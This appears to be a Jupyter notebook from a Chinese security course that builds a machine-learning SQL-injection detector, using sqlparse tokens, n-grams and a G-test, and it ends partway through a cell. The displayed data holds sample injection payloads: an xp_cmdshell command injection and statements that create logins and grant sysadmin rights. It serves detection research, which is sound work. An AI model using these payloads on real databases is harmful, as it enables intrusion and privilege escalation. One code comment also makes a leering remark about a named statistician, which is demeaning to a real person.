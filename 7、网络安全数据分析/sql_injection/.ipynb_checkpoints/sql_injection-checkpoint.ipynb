{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SQL Injection Exercise\n",
    "\n",
    "<div style=\"float: right;\"><img src=\"files/images/sql_injection.gif\" width=\"300px\"></div>\n",
    "“SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序，其中恶意 SQL 语句是 SQL 注入攻击包括通过从客户端到应用程序的输入数据插入或“注入”SQL 查询。成功的 SQL 注入漏洞可以从数据库中读取敏感数据，修改数据库数据（插入/更新/删除），对数据库执行管理操作（例如关闭 DBMS），恢复 DBMS 文件系统上存在的给定文件的内容，并在 某些情况下会向操作系统发出命令。SQL 注入攻击是一种注入攻击，其中 SQL 命令被注入到数据平面输入中，以影响预定义 SQL 命令的执行。” -OWASP\n",
    "<br>\n",
    "<br><br>\n",
    "** All Code and IPython Notebooks for this talk http://clicksecurity.github.io/data_hacking **\n",
    "<br><br>\n",
    "\n",
    "Approach:\n",
    "<ul>\n",
    "  <li> 收集数据\n",
    "  <li> 探索与理解\n",
    "  <li> 一些简单的统计数据\n",
    "  <li> 特征向量\n",
    "  <li> 随机森林机器学习\n",
    "</ul>\n",
    "</font>\n",
    "\n",
    "sql注入基础原理（超详细）:https://www.jianshu.com/p/078df7a35671"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0.23.2'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import sklearn.feature_extraction\n",
    "sklearn.__version__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0.24.2'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "pd.__version__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'3.0.3'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import matplotlib\n",
    "matplotlib.__version__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# import data_hacking\n",
    "# data_hacking.__version__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np\n",
    "import collections\n",
    "import math\n",
    "import heapq\n",
    "import math\n",
    "\n",
    "class FixedHeap(list):\n",
    "    def __init__(self, N):\n",
    "        self._N = N\n",
    "        super(list, self).__init__()\n",
    "    def push(self, item):\n",
    "        if (len(self) == self._N):\n",
    "            heapq.heappushpop(self,item)\n",
    "        else:\n",
    "            heapq.heappush(self, item)\n",
    "    def sorted(self):\n",
    "        return heapq.nlargest(self._N, self)\n",
    "    def max(self):\n",
    "        return heapq.nlargest(1, self)[0]\n",
    "\n",
    "class GTest():\n",
    "    ''' This is homegrown functionality for contingency table, and G-test\n",
    "        for two pandas series with categorical (nominal) values. G-test is\n",
    "        for goodness of fit to a distribution and for independence in contingency\n",
    "        tables. It's related to chi-squared, multinomial and Fisher's exact test,\n",
    "        please see http://en.wikipedia.org/wiki/G_test (Wikipedia).\n",
    "        Disclaimer: We have gone off the reservation here. This code isn't generalized\n",
    "                    and isn't well tested, there may be bugs (will be bugs),\n",
    "                    please use another method if available.\n",
    "\n",
    "    '''\n",
    "    def __init__(self):\n",
    "        ''' Init for GTest '''\n",
    "\n",
    "    def highest_gtest_scores(self, series_a, series_b, N=10, matches=10, reverse=False, min_volume=0):\n",
    "        '''\n",
    "            Inputs:\n",
    "                    series_a, series_b: both should contain categorical data values (countries, protocols, etc).\n",
    "                    N: How many of the top N keys in series_a should be returned.\n",
    "                    matches: How many matches for each key should be returned.\n",
    "                    reverse: Reverse sort, normal sort is highest g-score to lowest, reverse is opposite\n",
    "                    min_volume: For some data you only want to see values with reasonable volume.\n",
    "\n",
    "            Output:\n",
    "                    There are 3 outputs,\n",
    "                    - contingency table (raw counts)\n",
    "                    - conditional distribution (row proportions)\n",
    "                    - g_scores + everything in the first two outputs\n",
    "\n",
    "            Note:\n",
    "                    N culling happens before min_volume, so there might be a case where N is further restricted by a min_volume setting.\n",
    "                    Matches will cause at most N * matches cols in the dataframe. The matches are calculated as the top/most frequent\n",
    "                    matches for each value in series_a, so there can be some overlap. This seemed better than shotgunning a choice\n",
    "                    or taking the first 'matches' out of the whole dataframe.\n",
    "        '''\n",
    "\n",
    "        # Might Need Improvement:\n",
    "        #     Expected counts, assuming uniform distribution under the null hypothesis.\n",
    "        #     Which in this case means that series_a's categories will be equally\n",
    "        #     distributed among series_b's categories.\n",
    "        #\n",
    "        #     Note: I might need some 'private' lessons from Alison Gibbs on exactly how\n",
    "        #           this should be done, she is SO cute! (and also super smart of course :)\n",
    "        #           http://www.youtube.com/watch?v=0nmxFpNBFIYA\n",
    "\n",
    "        if N > 0:\n",
    "            topN = series_a.value_counts().head(N).index.tolist()\n",
    "            drop = []\n",
    "            for i, row in series_a.iteritems():\n",
    "                if row not in topN:\n",
    "                    drop.append(i)\n",
    "\n",
    "            # get rid of all rows in each Series that don't line up with a value in the top N, this keeps them\n",
    "            # both in sync for building the contingency table below.\n",
    "            series_a = series_a.drop(drop)\n",
    "            series_b = series_b.drop(drop)\n",
    "            series_a.index = range(len(series_a))\n",
    "            series_b.index = range(len(series_b))\n",
    "\n",
    "        mar_dist_a = series_a.value_counts().astype(float)  # Marginal distibution of A\n",
    "        mar_dist_b = series_b.value_counts().astype(float)  # Marginal distibution of B\n",
    "        total_count = float(sum(mar_dist_a))  # Both mar_dist_a/b will sum up to the same thing\n",
    "\n",
    "        # Filter out anything less than the minimum volume parameter.\n",
    "        # Kinda cheesy but handy to weed out low volume counts.\n",
    "        # 把出现次数为0的删除\n",
    "        mar_dist_a = mar_dist_a[mar_dist_a > min_volume]\n",
    "\n",
    "        # Count up all the times that a category from series_a\n",
    "        # matches up with a category from series_b. This is\n",
    "        # basically a gigantic contingency table\n",
    "        cont_table = collections.defaultdict(lambda : collections.Counter())\n",
    "        for val_a, val_b in zip(series_a.values, series_b.values):\n",
    "            cont_table[val_a][val_b] += 1\n",
    "\n",
    "        # Create a dataframe\n",
    "        # A dataframe with keys from series_a as the index, series_b_keys\n",
    "        # as the columns and the counts as the values.\n",
    "        dataframe = pd.DataFrame(cont_table.values(), index=cont_table.keys())\n",
    "        dataframe.fillna(0, inplace=True)\n",
    "\n",
    "        # Added support for matches back in. With this the dataframe will have at most matches * N cols\n",
    "        if matches > 0:\n",
    "            (rows, cols) = dataframe.shape\n",
    "            cols_to_keep = []\n",
    "            for r in range(rows):\n",
    "                cols_to_keep += dataframe.iloc[r].order(ascending=False).head(matches).index.tolist()[1:]\n",
    "            drop_cols = set(dataframe.columns.tolist()).difference(set(cols_to_keep))\n",
    "            dataframe = dataframe.drop(drop_cols, 1)\n",
    "\n",
    "        # For each column (except total) compute conditional distribution (row proportions)\n",
    "        # columns 为 ['legit', 'malicious']\n",
    "        columns = dataframe.columns.tolist()\n",
    "        dataframe_cd = pd.DataFrame.copy(dataframe)\n",
    "        dataframe_cd['total'] = mar_dist_a\n",
    "        for column in columns:\n",
    "            dataframe_cd[column] = dataframe_cd[column] / dataframe_cd['total']\n",
    "\n",
    "        dataframe_g = pd.DataFrame.copy(dataframe)\n",
    "        dataframe_g = dataframe_g.merge(dataframe_cd.rename(columns=lambda x: x + '_cd'), left_index=True, right_index=True)\n",
    "        # Now build the g-scores dataframe\n",
    "        # Fixme: Probably a better/faster way to do this (sleepy right now)\n",
    "        # one part fixed...\n",
    "        for column in columns:\n",
    "            dataframe_g[column+'_exp'] = mar_dist_a * mar_dist_b[column] / total_count\n",
    "            dataframe_g[column+'_g'] = [self.g_test_score(count, exp) for count, exp in zip(dataframe_g[column], dataframe_g[column+'_exp'])]\n",
    "#         print(columns)\n",
    "\n",
    "        # Return the 3 dataframes\n",
    "        return dataframe, dataframe_cd, dataframe_g,mar_dist_a,mar_dist_b,total_count,dataframe_g[column]\n",
    "\n",
    "    def g_test_score(self, count, expected):\n",
    "        #return count/expected\n",
    "        ''' G Test Score for likelihood ratio stats '''\n",
    "        if (count == 0):\n",
    "            return 0\n",
    "        else:\n",
    "            return 2.0 * count * math.log(count/expected)\n",
    "\n",
    "\n",
    "# Simple test of the functionality\n",
    "def _test():\n",
    "\n",
    "    import os\n",
    "    import pprint\n",
    "    import ast\n",
    "\n",
    "    # Open a dataset (relative path)\n",
    "    cwd = os.getcwd()\n",
    "    file_path = os.path.join(cwd, 'data/test_data.csv')\n",
    "    dataframe = pd.read_csv(file_path)\n",
    "    dataframe.head()\n",
    "\n",
    "    # Looking for correlations between sql names and status\n",
    "    g_test = GTest()\n",
    "    names, match_list, df = g_test.highest_gtest_scores(dataframe['name'], dataframe['status'], N=5)\n",
    "    print('\\n<<< Names with highest correlation to status >>>')\n",
    "    pprint.pprint(zip(names, match_list))\n",
    "    print(df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "malicious    12892\n",
      "legit         1003\n",
      "Name: type, dtype: int64\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious\n",
       "1           create user name identified by 'pass123'  malicious\n",
       "2  create user name identified by pass123 tempora...  malicious\n",
       "3               exec sp_addlogin 'name' , 'password'  malicious\n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Read in a set of SQL statements from various sources\n",
    "import os\n",
    "basedir = 'data'\n",
    "filelist = os.listdir(basedir) \n",
    "df_list = [] # DataFrame对象list\n",
    "for file in filelist:\n",
    "    # ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.read_csv.html\n",
    "    # 将csv文件数据读取到pandas框架的DataFrame对象\n",
    "    df = pd.read_csv(os.path.join(basedir,file), sep='\\r\\n', names=['raw_sql'], header=None, engine='python')\n",
    "    # 这里把合法('legit')SQL数据全部放在了一个独立文件中，文件命名为legit.txt\n",
    "    # 完成了数据标记过程\n",
    "    df['type'] = 'legit' if file.split('.')[0] == 'legit' else 'malicious'\n",
    "    df_list.append(df)\n",
    "\n",
    "# ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.concat.html\n",
    "# ignore_index设置为True表示合并后的pandas对象list采用0, ..., n - 1下标，忽略原始输入pandas对象的下标\n",
    "dataframe = pd.concat(df_list, ignore_index=True)\n",
    "# ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.DataFrame.dropna.html\n",
    "# 缺失值处理，inplace=True表示就地删除包含None值的行，默认axis=0表示按行检查和处理，axis=1表示按列处理\n",
    "dataframe.dropna(inplace=True)\n",
    "# ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.Series.value_counts.html\n",
    "# dataframe['type']的类型是<class 'pandas.core.series.Series'>\n",
    "print(dataframe['type'].value_counts())\n",
    "# 默认返回前5行数据 ref: https://pandas.pydata.org/pandas-docs/stable/generated/pandas.DataFrame.head.html\n",
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "'which' 不是内部或外部命令，也不是可运行的程序\n",
      "或批处理文件。\n"
     ]
    }
   ],
   "source": [
    "!which python"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### sqlparse 就是对sql语句做分解，操作介绍如下："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'CREATE TABLE metadatacollectionschema.metadatamedia ( omeroid integer NOT NULL, internalidcol numeric, namecollection text, investigationdesc text, snumber text, researchername text, campusorlocation text, species text, stains text, dyes text, tissueenvironment text, tissuetype text, publishstatus boolean NOT NULL DEFAULT false, CONSTRAINT metadatamedia_pkey PRIMARY KEY (omeroid) ) WITH (OIDS=FALSE)'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe['raw_sql'][100] # 这里有一个语句"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sqlparse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CREATE TABLE metadatacollectionschema.metadatamedia ( omeroid integer NOT NULL, internalidcol numeric, namecollection text, investigationdesc text, snumber text, researchername text, campusorlocation text, species text, stains text, dyes text, tissueenvironment text, tissuetype text, publishstatus boolean NOT NULL DEFAULT false, CONSTRAINT metadatamedia_pkey PRIMARY KEY (omeroid) ) WITH (OIDS=FALSE)\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[<DDL 'CREATE' at 0x225DDE55FA8>,\n",
       " <Whitespace ' ' at 0x225DDE55F48>,\n",
       " <Keyword 'TABLE' at 0x225DCDA8DC8>,\n",
       " <Whitespace ' ' at 0x225DDE6F048>,\n",
       " <Identifier 'metada...' at 0x225DDF27480>,\n",
       " <Whitespace ' ' at 0x225DDE6F228>,\n",
       " <Parenthesis '( omer...' at 0x225DDF27390>,\n",
       " <Whitespace ' ' at 0x225DDF45588>,\n",
       " <CTE 'WITH' at 0x225DDF455E8>,\n",
       " <Whitespace ' ' at 0x225DDF45648>,\n",
       " <Parenthesis '(OIDS=...' at 0x225DDF27408>]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "parsed = sqlparse.parse(dataframe['raw_sql'][100])\n",
    "print(parsed[0])\n",
    "parsed[0].tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'create user name identified by pass123 temporary tablespace temp default tablespace users;'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe['raw_sql'][2]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "# parse.tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "# [token._get_repr_name() for parse in parsed for token in parse.tokens if token._get_repr_name() != 'Whitespace'] # ._get_repr_name()用法"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "# for token in parse.tokens:\n",
    "#     print(token._get_repr_name())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### sqlparse的解释说明: https://toutiao.io/posts/8r5a002/preview"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Use the SQLParse module: sqlparse is a non-validating SQL parser module for Python\n",
    "# https://github.com/andialbrecht/sqlparse\n",
    "# pip install sqlparse\n",
    "# import sqlparse\n",
    "def parse_it(raw_sql):\n",
    "    parsed = sqlparse.parse(raw_sql)\n",
    "    # ref: https://docs.python.org/3/reference/expressions.html#displays-for-lists-sets-and-dictionaries\n",
    "    # 以下是非常pythonic的写法，学名是comprehension\n",
    "    # print(parsed[0].tokens)\n",
    "    return [token._get_repr_name() for parse in parsed for token in parse.tokens if token._get_repr_name() != 'Whitespace']\n",
    "    # ['DDL', 'Keyword', 'Identifier', 'Parenthesis', 'CTE', 'Parenthesis']\n",
    "\n",
    "# ref: https://www.python-course.eu/python3_lambda.php\n",
    "dataframe['parsed_sql'] = dataframe['raw_sql'].map(lambda x: parse_it(x))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "对比 [长亭科技的SQL注入检测方案](https://blog.chaitin.cn/sqlchop-the-sqli-detection-engine/) ，基于SQLParse的这里的SQL注入检测算法存在以下缺陷：\n",
    "\n",
    "* SQLParse不是一个基于SQL语法检查和解析引擎的分析器，因此对于一些SQL注入的代码混淆手段存在天然缺陷\n",
    "* （WAF的通病和挑战）缺少对后端被保护应用、数据库和业务的上下文理解。例如：\n",
    "    * 博客程序允许用户发送富文本数据，用户编写了一篇研究SQL注入技巧的文章\n",
    "    * 攻击者使用了一些针对特定数据库的SQL语法特性来构造攻击向量，但针对当前被保护数据库来说，这些攻击向量并不会达到攻击效果。因此，检测引擎基于当前应用环境会产生大量误报\n",
    "\n",
    "根据上述长亭科技的博客推荐，可以试试用[client9/libinjection](https://github.com/client9/libinjection/)来替换掉或补充到这里的SQLParse的角色和作用。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, S...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type  \\\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1           create user name identified by 'pass123'  malicious   \n",
       "2  create user name identified by pass123 tempora...  malicious   \n",
       "3               exec sp_addlogin 'name' , 'password'  malicious   \n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious   \n",
       "\n",
       "                                          parsed_sql  \n",
       "0  [Single, Identifier, Float, Float, Float, Erro...  \n",
       "1  [DDL, Keyword, Identifier, Keyword, Keyword, S...  \n",
       "2  [DDL, Keyword, Identifier, Keyword, Keyword, I...  \n",
       "3              [Keyword, Identifier, IdentifierList]  \n",
       "4              [Keyword, Identifier, IdentifierList]  "
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Looking at the SQL tokens is 'kinda' interesting but sequences of tokens and transitions\n",
    "# between tokens seems more meaningful so we're also going to compute sequences by\n",
    "# computing NGrams for every SQL statement...\n",
    "def ngrams(lst, N):\n",
    "    ngrams = []\n",
    "    for n in range(N):\n",
    "        # ref: https://docs.python.org/3/library/functions.html#zip\n",
    "        # python内置函数，zip将多个迭代器“对位”合并为一个新迭代器，合并后的新迭代器长度取决于最短的输入迭代器，超长部分会被截断舍弃\n",
    "        # 官方建议zip仅用于处理长度相等的迭代器合并，避免数据截断丢失\n",
    "        ngrams += zip(*(lst[i:] for i in range(n+1)))\n",
    "    return [str(tuple) for tuple in ngrams]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "## [str(tuple) for tuple in ngrams] 返回的数据展示\n",
    "# lst = dataframe['parsed_sql'][1]\n",
    "# ngrams = []\n",
    "# for n in range(3):\n",
    "#     ngrams +=zip(*(lst[i:] for i in range(n+1)))\n",
    "# [str(tuple) for tuple in ngrams]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "dataframe['sequences'] = dataframe['parsed_sql'].map(lambda x: ngrams(x, 3))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### We'd like to run some simple statistics to see what correlations the data might contain. Here we want to see if certain tokens or sets of transitions are indicative of malicious sql statements.\n",
    "\n",
    "> In statistics, G-tests are likelihood-ratio or maximum likelihood statistical significance tests that are increasingly being used in situations where chi-squared tests were previously recommended.\n",
    "\n",
    "> G-tests是 似然率 或者 最大似然显著性统计检验。\n",
    "\n",
    "#### G-test is for goodness of fit to a distribution and for independence in contingency tables. It's related to chi-squared, multinomial and Fisher's exact test, please see http://en.wikipedia.org/wiki/G_test.\n",
    "\n",
    "#### 当一个属性(如性别)有两个(如男，女)或多个变量，而且对于属性变量有着理论的期望比值(如1：1)。G-test就是用于验证观测变量值是否符合理论期望的比值。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 下面 token_expansion 函数：\n",
    "\n",
    "    zip(*[(token,token_type) for t_list,token_type in zip(series,types) for token in t_list]) 最后得到的结果说明"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "# dataframe['sequences'][0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "# list(zip(dataframe['sequences'],dataframe['type']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "# list(zip(*[(token,token_type) for t_list,token_type in zip(dataframe['sequences'],dataframe['type']) for token in t_list]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "# for t_list,token_type in zip(dataframe['sequences'],dataframe['type']):\n",
    "#     for token in t_list:\n",
    "#         print((token,token_type))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### token_expansion\n",
    "\n",
    "将每一个关键字和标签进行绑定，比如 (\"('Single',)\", 'malicious') 可以看上面注释的代码运行的结果"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Helper method\n",
    "def token_expansion(series, types):\n",
    "    # 将每一个关键字和标签进行绑定，比如 (\"('Single',)\", 'malicious') 可以看上面注释的代码运行的结果\n",
    "    _tokens, _types = zip(*[(token,token_type) for t_list,token_type in zip(series,types) for token in t_list])\n",
    "    return pd.Series(_tokens), pd.Series(_types)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0        [('Single',), ('Identifier',), ('Float',), ('F...\n",
       "1        [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "2        [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "3        [('Keyword',), ('Identifier',), ('IdentifierLi...\n",
       "4        [('Keyword',), ('Identifier',), ('IdentifierLi...\n",
       "5        [('DML',), ('Keyword',), ('Identifier',), ('Va...\n",
       "6        [('Keyword',), ('Keyword',), ('Keyword',), ('I...\n",
       "7        [('DML',), ('Keyword',), ('Function',), ('Keyw...\n",
       "8        [('DDL',), ('Keyword',), ('Keyword',), ('Ident...\n",
       "9        [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "10       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "11       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "12       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "13       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "14       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "15       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "16       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "17       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "18       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "19       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "20       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "21       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "22       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "23       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "24       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "25       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "26       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "27       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "28       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "29       [('DDL',), ('Keyword',), ('Identifier',), ('Ke...\n",
       "                               ...                        \n",
       "13865    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13866    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13867    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13868    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13869    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13870    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13871    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13872    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13873    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13874    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13875    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13876    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13877    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13878    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13879    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13880    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13881    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13882    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13883    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13884    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13885    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13886    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13887    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13888    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13889    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13890    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13891    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13892    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13893    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "13894    [('Identifier',), ('Identifier',), ('Identifie...\n",
       "Name: sequences, Length: 13895, dtype: object"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe['sequences']"
   ]
  },
  {
   "cell_type": "code",
